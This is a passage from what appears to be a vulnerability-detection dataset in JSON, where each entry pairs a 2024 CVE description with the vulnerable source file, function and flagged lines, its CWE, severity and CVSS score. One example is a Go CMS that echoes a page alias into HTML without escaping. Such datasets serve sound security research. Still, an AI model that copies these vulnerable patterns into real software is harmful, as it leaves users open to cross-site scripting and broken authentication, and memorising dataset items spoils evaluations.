          "content": "/*!\n * serve-static\n * Copyright(c) 2010 Sencha Inc.\n * Copyright(c) 2011 TJ Holowaychuk\n * Copyright(c) 2014-2016 Douglas Christopher Wilson\n * MIT Licensed\n */\n\n'use strict'\n\n/**\n * Module dependencies.\n * @private\n */\n\nvar encodeUrl = require('encodeurl')\nvar escapeHtml = require('escape-html')\nvar parseUrl = require('parseurl')\nvar resolve = require('path').resolve\nvar send = require('send')\nvar url = require('url')\n\n/**\n * Module exports.\n * @public\n */\n\nmodule.exports = serveStatic\n\n/**\n * @param {string} root\n * @param {object} [options]\n * @return {function}\n * @public\n */\n\nfunction serveStatic (root, options) {\n  if (!root) {\n    throw new TypeError('root path required')\n  }\n\n  if (typeof root !== 'string') {\n    throw new TypeError('root path must be a string')\n  }\n\n  // copy options object\n  var opts = Object.create(options || null)\n\n  // fall-though\n  var fallthrough = opts.fallthrough !== false\n\n  // default redirect\n  var redirect = opts.redirect !== false\n\n  // headers listener\n  var setHeaders = opts.setHeaders\n\n  if (setHeaders && typeof setHeaders !== 'function') {\n    throw new TypeError('option setHeaders must be function')\n  }\n\n  // setup options for send\n  opts.maxage = opts.maxage || opts.maxAge || 0\n  opts.root = resolve(root)\n\n  // construct directory listener\n  var onDirectory = redirect\n    ? createRedirectDirectoryListener()\n    : createNotFoundDirectoryListener()\n\n  return function serveStatic (req, res, next) {\n    if (req.method !== 'GET' && req.method !== 'HEAD') {\n      if (fallthrough) {\n        return next()\n      }\n\n      // method not allowed\n      res.statusCode = 405\n      res.setHeader('Allow', 'GET, HEAD')\n      res.setHeader('Content-Length', '0')\n      res.end()\n      return\n    }\n\n    var forwardError = !fallthrough\n    var originalUrl = parseUrl.original(req)\n    var path = parseUrl(req).pathname\n\n    // make sure redirect occurs at mount\n    if (path === '/' && originalUrl.pathname.substr(-1) !== '/') {\n      path = ''\n    }\n\n    // create send stream\n    var stream = send(req, path, opts)\n\n    // add directory handler\n    stream.on('directory', onDirectory)\n\n    // add headers listener\n    if (setHeaders) {\n      stream.on('headers', setHeaders)\n    }\n\n    // add file listener for fallthrough\n    if (fallthrough) {\n      stream.on('file', function onFile () {\n        // once file is determined, always forward error\n        forwardError = true\n      })\n    }\n\n    // forward errors\n    stream.on('error', function error (err) {\n      if (forwardError || !(err.statusCode < 500)) {\n        next(err)\n        return\n      }\n\n      next()\n    })\n\n    // pipe\n    stream.pipe(res)\n  }\n}\n\n/**\n * Collapse all leading slashes into a single slash\n * @private\n */\nfunction collapseLeadingSlashes (str) {\n  for (var i = 0; i < str.length; i++) {\n    if (str.charCodeAt(i) !== 0x2f /* / */) {\n      break\n    }\n  }\n\n  return i > 1\n    ? '/' + str.substr(i)\n    : str\n}\n\n/**\n * Create a minimal HTML document.\n *\n * @param {string} title\n * @param {string} body\n * @private\n */\n\nfunction createHtmlDocument (title, body) {\n  return '<!DOCTYPE html>\\n' +\n    '<html lang=\"en\">\\n' +\n    '<head>\\n' +\n    '<meta charset=\"utf-8\">\\n' +\n    '<title>' + title + '</title>\\n' +\n    '</head>\\n' +\n    '<body>\\n' +\n    '<pre>' + body + '</pre>\\n' +\n    '</body>\\n' +\n    '</html>\\n'\n}\n\n/**\n * Create a directory listener that just 404s.\n * @private\n */\n\nfunction createNotFoundDirectoryListener () {\n  return function notFound () {\n    this.error(404)\n  }\n}\n\n/**\n * Create a directory listener that performs a redirect.\n * @private\n */\n\nfunction createRedirectDirectoryListener () {\n  return function redirect (res) {\n    if (this.hasTrailingSlash()) {\n      this.error(404)\n      return\n    }\n\n    // get original URL\n    var originalUrl = parseUrl.original(this.req)\n\n    // append trailing slash\n    originalUrl.path = null\n    originalUrl.pathname = collapseLeadingSlashes(originalUrl.pathname + '/')\n\n    // reformat the URL\n    var loc = encodeUrl(url.format(originalUrl))\n    var doc = createHtmlDocument('Redirecting', 'Redirecting to <a href=\"' + escapeHtml(loc) + '\">' +\n      escapeHtml(loc) + '</a>')\n\n    // send redirect response\n    res.statusCode = 301\n    res.setHeader('Content-Type', 'text/html; charset=UTF-8')\n    res.setHeader('Content-Length', Buffer.byteLength(doc))\n    res.setHeader('Content-Security-Policy', \"default-src 'none'\")\n    res.setHeader('X-Content-Type-Options', 'nosniff')\n    res.setHeader('Location', loc)\n    res.end(doc)\n  }\n}\n"
        }
      ],
      "method_level": [
        "function createRedirectDirectoryListener () {\n  return function redirect (res) {\n    if (this.hasTrailingSlash()) {\n      this.error(404)\n      return\n    }\n\n    // get original URL\n    var originalUrl = parseUrl.original(this.req)\n\n    // append trailing slash\n    originalUrl.path = null\n    originalUrl.pathname = collapseLeadingSlashes(originalUrl.pathname + '/')\n\n    // reformat the URL\n    var loc = encodeUrl(url.format(originalUrl))\n    var doc = createHtmlDocument('Redirecting', 'Redirecting to <a href=\"' + escapeHtml(loc) + '\">' +\n      escapeHtml(loc) + '</a>')\n\n    // send redirect response\n    res.statusCode = 301\n    res.setHeader('Content-Type', 'text/html; charset=UTF-8')\n    res.setHeader('Content-Length', Buffer.byteLength(doc))\n    res.setHeader('Content-Security-Policy', \"default-src 'none'\")\n    res.setHeader('X-Content-Type-Options', 'nosniff')\n    res.setHeader('Location', loc)\n    res.end(doc)\n  }\n}"
      ],
      "hunk_level": [
        {
          "line_no": 197,
          "content": "    var doc = createHtmlDocument('Redirecting', 'Redirecting to <a href=\"' + escapeHtml(loc) + '\">' +"
        },
        {
          "line_no": 198,
          "content": "      escapeHtml(loc) + '</a>')"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.0,
    "cvss_version": 3.1
  },
  {
    "id": 1159,
    "cve": "CVE-2024-8572",
    "description": "A vulnerability was found in Gouniverse GoLang CMS 1.4.0. It has been declared as problematic. This vulnerability affects the function PageRenderHtmlByAlias of the file FrontendHandler.go. The manipulation of the argument alias leads to cross site scripting. The attack can be initiated remotely. Upgrading to version 1.4.1 is able to address this issue. The patch is identified as 3e661cdfb4beeb9fe2ad507cdb8104c0b17d072c. It is recommended to upgrade the affected component.",
    "vulnerability": {
      "file_level": [
        {
          "name": "PageBuildHtml.go",
          "content": "package cms\n\nimport (\n\t\"net/http\"\n\t\"strings\"\n\n\t\"github.com/samber/lo\"\n)\n\n// PageRenderHtmlByAlias builds the HTML of a page based on its alias\nfunc (cms *Cms) PageRenderHtmlByAlias(r *http.Request, alias string, language string) string {\n\tpage, err := cms.PageFindByAlias(alias)\n\n\tif err != nil {\n\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())\n\t\treturn \"Page with alias '\" + alias + \"' not found\"\n\t}\n\n\tif page == nil {\n\t\treturn \"Page with alias '\" + alias + \"' not found\"\n\t}\n\n\tpageAttrs, err := page.GetAttributes()\n\n\tif err != nil {\n\t\treturn \"Page '\" + alias + \"' io exception\"\n\t}\n\n\tpageContent := \"\"\n\tpageTitle := \"\"\n\tpageMetaKeywords := \"\"\n\tpageMetaDescription := \"\"\n\tpageMetaRobots := \"\"\n\tpageCanonicalURL := \"\"\n\tpageTemplateID := \"\"\n\tfor _, attr := range pageAttrs {\n\t\tif attr.AttributeKey() == \"content\" {\n\t\t\tpageContent = attr.AttributeValue()\n\t\t}\n\t\tif attr.AttributeKey() == \"title\" {\n\t\t\tpageTitle = attr.AttributeValue()\n\t\t}\n\t\tif attr.AttributeKey() == \"meta_keywords\" {\n\t\t\tpageMetaKeywords = attr.AttributeValue()\n\t\t}\n\t\tif attr.AttributeKey() == \"meta_description\" {\n\t\t\tpageMetaDescription = attr.AttributeValue()\n\t\t}\n\t\tif attr.AttributeKey() == \"meta_robots\" {\n\t\t\tpageMetaRobots = attr.AttributeValue()\n\t\t}\n\t\tif attr.AttributeKey() == \"canonical_url\" {\n\t\t\tpageCanonicalURL = attr.AttributeValue()\n\t\t}\n\t\tif attr.AttributeKey() == \"template_id\" {\n\t\t\tpageTemplateID = attr.AttributeValue()\n\t\t}\n\t}\n\n\tfinalContent := lo.If(pageTemplateID == \"\", pageContent).ElseF(func() string {\n\t\tcontent, err := cms.TemplateContentFindByID(pageTemplateID)\n\t\tif err != nil {\n\t\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())\n\t\t}\n\t\treturn content\n\t})\n\n\treplacements := map[string]string{\n\t\t\"PageContent\":         pageContent,\n\t\t\"PageCanonicalUrl\":    pageCanonicalURL,\n\t\t\"PageMetaDescription\": pageMetaDescription,\n\t\t\"PageMetaKeywords\":    pageMetaKeywords,\n\t\t\"PageRobots\":          pageMetaRobots,\n\t\t\"PageTitle\":           pageTitle,\n\t}\n\n\tfor key, value := range replacements {\n\t\tfinalContent = strings.ReplaceAll(finalContent, \"[[\"+key+\"]]\", value)\n\t\tfinalContent = strings.ReplaceAll(finalContent, \"[[ \"+key+\" ]]\", value)\n\t}\n\n\tfinalContent, err = cms.ContentRenderBlocks(finalContent)\n\n\tif err != nil {\n\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())\n\t}\n\n\tfinalContent, err = cms.ContentRenderShortcodes(r, finalContent)\n\n\tif err != nil {\n\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())\n\t}\n\n\tfinalContent, err = cms.ContentRenderTranslations(finalContent, language)\n\n\tif err != nil {\n\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())\n\t}\n\n\treturn finalContent\n}\n"
        }
      ],
      "method_level": [
        "func (cms *Cms) PageRenderHtmlByAlias(r *http.Request, alias string, language string) string {\n\tpage, err := cms.PageFindByAlias(alias)\n\n\tif err != nil {\n\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())\n\t\treturn \"Page with alias '\" + alias + \"' not found\"\n\t}\n\n\tif page == nil {\n\t\treturn \"Page with alias '\" + alias + \"' not found\"\n\t}\n\n\tpageAttrs, err := page.GetAttributes()\n\n\tif err != nil {\n\t\treturn \"Page '\" + alias + \"' io exception\"\n\t}\n\n\tpageContent := \"\"\n\tpageTitle := \"\"\n\tpageMetaKeywords := \"\"\n\tpageMetaDescription := \"\"\n\tpageMetaRobots := \"\"\n\tpageCanonicalURL := \"\"\n\tpageTemplateID := \"\"\n\tfor _, attr := range pageAttrs {\n\t\tif attr.AttributeKey() == \"content\" {\n\t\t\tpageContent = attr.AttributeValue()\n\t\t}\n\t\tif attr.AttributeKey() == \"title\" {\n\t\t\tpageTitle = attr.AttributeValue()\n\t\t}\n\t\tif attr.AttributeKey() == \"meta_keywords\" {\n\t\t\tpageMetaKeywords = attr.AttributeValue()\n\t\t}\n\t\tif attr.AttributeKey() == \"meta_description\" {\n\t\t\tpageMetaDescription = attr.AttributeValue()\n\t\t}\n\t\tif attr.AttributeKey() == \"meta_robots\" {\n\t\t\tpageMetaRobots = attr.AttributeValue()\n\t\t}\n\t\tif attr.AttributeKey() == \"canonical_url\" {\n\t\t\tpageCanonicalURL = attr.AttributeValue()\n\t\t}\n\t\tif attr.AttributeKey() == \"template_id\" {\n\t\t\tpageTemplateID = attr.AttributeValue()\n\t\t}\n\t}\n\n\tfinalContent := lo.If(pageTemplateID == \"\", pageContent).ElseF(func() string {\n\t\tcontent, err := cms.TemplateContentFindByID(pageTemplateID)\n\t\tif err != nil {\n\t\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())\n\t\t}\n\t\treturn content\n\t})\n\n\treplacements := map[string]string{\n\t\t\"PageContent\":         pageContent,\n\t\t\"PageCanonicalUrl\":    pageCanonicalURL,\n\t\t\"PageMetaDescription\": pageMetaDescription,\n\t\t\"PageMetaKeywords\":    pageMetaKeywords,\n\t\t\"PageRobots\":          pageMetaRobots,\n\t\t\"PageTitle\":           pageTitle,\n\t}\n\n\tfor key, value := range replacements {\n\t\tfinalContent = strings.ReplaceAll(finalContent, \"[[\"+key+\"]]\", value)\n\t\tfinalContent = strings.ReplaceAll(finalContent, \"[[ \"+key+\" ]]\", value)\n\t}\n\n\tfinalContent, err = cms.ContentRenderBlocks(finalContent)\n\n\tif err != nil {\n\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())\n\t}\n\n\tfinalContent, err = cms.ContentRenderShortcodes(r, finalContent)\n\n\tif err != nil {\n\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())\n\t}\n\n\tfinalContent, err = cms.ContentRenderTranslations(finalContent, language)\n\n\tif err != nil {\n\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())\n\t}\n\n\treturn finalContent\n}"
      ],
      "hunk_level": [
        {
          "line_no": 15,
          "content": "\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())"
        },
        {
          "line_no": 16,
          "content": "\t\treturn \"Page with alias '\" + alias + \"' not found\""
        },
        {
          "line_no": 20,
          "content": "\t\treturn \"Page with alias '\" + alias + \"' not found\""
        },
        {
          "line_no": 26,
          "content": "\t\treturn \"Page '\" + alias + \"' io exception\""
        },
        {
          "line_no": 63,
          "content": "\t\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())"
        },
        {
          "line_no": 85,
          "content": "\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())"
        },
        {
          "line_no": 91,
          "content": "\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())"
        },
        {
          "line_no": 97,
          "content": "\t\tcms.LogStore.ErrorWithContext(\"At pageBuldHTMLByAlias\", err.Error())"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 4.0
  },
  {
    "id": 1304,
    "cve": "CVE-2024-11680",
    "description": "ProjectSend versions prior to r1720 are affected by an improper authentication vulnerability. Remote, unauthenticated attackers can exploit this flaw by sending crafted HTTP requests to options.php, enabling unauthorized modification of the application's configuration. Successful exploitation allows attackers to create accounts, upload webshells, and embed malicious JavaScript.",
    "vulnerability": {
      "file_level": [
        {
          "name": "includes/functions.session.permissions.php",
          "content": "<?php\n/**\n * Contains all the functions used to validate the current logged in\n * client or user.\n */\n\n function extend_session()\n{\n    $_SESSION['last_call'] = time();\n}\n\nfunction session_expired()\n{\n    if ( defined('SESSION_TIMEOUT_EXPIRE') && SESSION_TIMEOUT_EXPIRE == true ) {\n        if (isset($_SESSION['last_call']) && (time() - $_SESSION['last_call'] > SESSION_EXPIRE_TIME)) {\n            return true;\n        }\n    }\n\n    return false;\n}\n\n/**\n * Used on header.php to check if there is an active session or valid\n * cookie before generating the content.\n * If none is found, redirect to the log in form.\n */\nfunction redirect_if_not_logged_in()\n{\n    $redirect = false;\n    if (!user_is_logged_in()) {\n        $redirect = true;\n    } else {\n        if (isset($_SESSION['user_id'])) {\n            $user = new \\ProjectSend\\Classes\\Users($_SESSION['user_id']);\n            if (!$user->userExists()) {\n                $redirect = true;\n            }\n        }\n    }\n\n    if ($redirect) {\n        $_SESSION = [];\n        session_destroy();\n        ps_redirect(BASE_URI . \"index.php\");\n    }\n}\n\nfunction user_is_logged_in()\n{\n    if (isset($_SESSION['user_id'])) {\n        $user = new \\ProjectSend\\Classes\\Users($_SESSION['user_id']);\n        if ($user->userExists()) {\n            return true;\n        }\n    }\n\n    return false;\n}\n\n/**\n * Used on header.php to check if the current logged in system user has the\n * permission to view this page.\n */\nfunction redirect_if_role_not_allowed($allowed_levels = null) {\n\t$permission = false;\n\n    if (!empty($allowed_levels)) {\n\t\t/**\n\t\t * Check for a session, and if found see if the user\n\t\t * level is among those defined by the page.\n\t\t *\n\t\t * $allowed_levels in defined on each page before the inclusion of header.php\n        */\n        if (user_is_logged_in()) {\n            $user = new \\ProjectSend\\Classes\\Users($_SESSION['user_id']);\n            $user_data = $user->getProperties();\n\n            if (isset($user_data['role']) && in_array($user_data['role'], $allowed_levels)) {\n                $permission = true;\n            }\n        }\n\t\t/**\n\t\t * After the checks, if the user is allowed, continue.\n\t\t * If not, show the \"Not allowed message\", then the footer, then die(); so the\n\t\t * actual page content is not generated.\n\t\t*/\n    }\n\n    if ($permission != true) {\n        exit_with_error_code(403);\n    }\n}\n\n// Requires password change?\nfunction password_change_required()\n{\n    global $flash;\n    $session_user = new \\ProjectSend\\Classes\\Users(CURRENT_USER_ID);\n\n    if ($session_user->requiresPasswordChange()) {\n        $url = (CURRENT_USER_LEVEL == 0) ? 'clients-edit.php' : 'users-edit.php';\n        if (basename($_SERVER[\"SCRIPT_FILENAME\"]) != $url) {\n            $flash->error(__('Password change is required for your account', 'cftp_admin'));\n\n            $url .= '?id='.CURRENT_USER_ID;\n            ps_redirect(BASE_URI.$url);\n        }\n    }\n}\n\nfunction user_can_upload_any_file_type($user_id = CURRENT_USER_ID)\n{\n    $user = new \\ProjectSend\\Classes\\Users($user_id);\n    $properties = $user->getProperties();\n\n    if (!empty(get_option('file_types_limit_to'))) {\n        switch ( get_option('file_types_limit_to') ) {\n            case 'noone':\n                return true;\n            break;\n            case 'all':\n                return false;\n            break;\n            case 'clients':\n                if ($properties['role'] == 0) {\n                    return false;\n                }\n            break;\n        }\n    }\n    unset($user); unset($properties);\n    \n    return true;\n}\n\nfunction current_user_can_view_files_list()\n{\n    if (defined('IS_PUBLIC_VIEW')) {\n        return true;\n    }\n\n    $user = new \\ProjectSend\\Classes\\Users(CURRENT_USER_ID);\n    $props = $user->getProperties();\n\n    if ( $props['active'] == '0' ) {\n        return false;\n    }\n\n    if (!$user->isClient()) {\n        return true;\n    } else {\n        if ($props['username'] == CURRENT_USER_USERNAME) {\n            return true;\n        }\n    }\n\n    return false;\n}\n"
        }
      ],
      "method_level": [
        "function extend_session()\n{\n    $_SESSION['last_call'] = time();\n}"
      ],
      "hunk_level": [
        {
          "line_no": 7,
          "content": " function extend_session()"
        }
      ]
    },
    "cwe": [
      "CWE-863",
      "CWE-287"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_version": 3.1
  },
  {
    "id": 432,
    "cve": "CVE-2024-28195",
    "description": "your_spotify is an open source, self hosted Spotify tracking dashboard. YourSpotify versions < 1.9.0 do not protect the API and login flow against Cross-Site Request Forgery (CSRF). Attackers can use this to execute CSRF attacks on victims, allowing them to retrieve, modify or delete data on the affected YourSpotify instance. Using repeated CSRF attacks, it is also possible to create a new user on the victim instance and promote the new user to instance administrator if a legitimate administrator visits a website prepared by an attacker. Note: Real-world exploitability of this vulnerability depends on the browser version and browser settings in use by the victim. This issue has been addressed in version 1.9.0. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "apps/server/src/database/queries/privateData.ts",
          "content": "import { randomUUID } from \"crypto\";\nimport { PrivateDataModel } from \"../Models\";\n\nexport async function createPrivateData() {\n  await PrivateDataModel.create({ jwtPrivateKey: randomUUID() });\n}\n\nexport async function getPrivateData() {\n  return PrivateDataModel.findOne({});\n}\n"
        }
      ],
      "method_level": [
        "createPrivateData"
      ],
      "hunk_level": [
        {
          "line_no": 5,
          "content": "  await PrivateDataModel.create({ jwtPrivateKey: randomUUID() });"
        }
      ]
    },
    "cwe": [
      "CWE-352"
    ],
    "severity": "HIGH",
    "cvss_score": 8.1,
    "cvss_version": 3.1
  },
  {
    "id": 69,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to title 17 Section 105 of the\n# United States Code this software is not subject to copyright\n# protection and is in the public domain. NIST assumes no\n# responsibility whatsoever for its use by other parties, and makes\n# no guarantees, expressed or implied, about its quality,\n# reliability, or any other characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\"\"\"\n\n__version__ = \"0.3.1\"\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, an environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 90,
          "content": "        try:"
        },
        {
          "line_no": 96,
          "content": "        except ValueError:"
        },
        {
          "line_no": 97,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 98,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 836,
    "cve": "CVE-2024-5211",
    "description": "A path traversal vulnerability in mintplex-labs/anything-llm allowed a manager to bypass the `normalizePath()` function, intended to defend against path traversal attacks. This vulnerability enables the manager to read, delete, or overwrite the 'anythingllm.db' database file and other files stored in the 'storage' directory, such as internal communication keys and .env secrets. Exploitation of this vulnerability could lead to application compromise, denial of service (DoS) attacks, and unauthorized admin account takeover. The issue stems from improper validation of user-supplied input in the process of setting a custom logo for the app, which can be manipulated to achieve arbitrary file read, deletion, or overwrite, and to execute a DoS attack by deleting critical files required for the application's operation.",
    "vulnerability": {
      "file_level": [
        {
          "name": "collector/utils/files/index.js",
